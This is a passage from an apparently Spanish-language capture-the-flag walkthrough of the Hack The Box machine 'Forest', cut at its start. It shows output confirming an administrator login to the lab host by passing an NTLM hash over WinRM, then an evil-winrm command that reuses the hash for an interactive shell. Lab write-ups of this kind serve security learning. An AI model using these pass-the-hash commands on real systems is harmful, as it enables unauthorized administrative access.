/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.95.210   5985   FOREST           [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
```

Nos conectamos a `WinRM` mediante `evil-winrm` para obtener una consola interactiva.

```PowerShell
evil-winrm -i 10.129.95.210 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

La flag de `root` se encuentra en `C:\Users\Administrator\Desktop`.

---